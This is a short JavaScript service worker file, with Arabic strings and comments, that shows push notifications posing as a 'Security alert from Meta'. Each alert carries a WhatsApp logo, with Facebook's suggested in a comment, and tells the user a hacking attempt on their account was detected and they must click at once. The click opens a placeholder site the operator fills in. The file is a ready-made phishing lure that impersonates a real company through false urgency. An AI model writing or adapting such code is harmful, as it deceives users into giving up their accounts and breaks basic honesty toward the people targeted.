self.addEventListener('push', function(event) {
    const options = {
        body: 'تم رصد محاولة اختراق لحسابك! اضغط فوراً لتأمين الحساب.',
        icon: 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg', // أو شعار فيسبوك
        badge: 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg',
        vibrate: [200, 100, 200],
        data: { url: 'https://yourname.github.io/your-repo/' } // رابط موقعك هنا
    };

    event.waitUntil(
        self.registration.showNotification('تنبيه أمني من Meta', options)
    );
});

self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    event.waitUntil(clients.openWindow(event.notification.data.url));
});
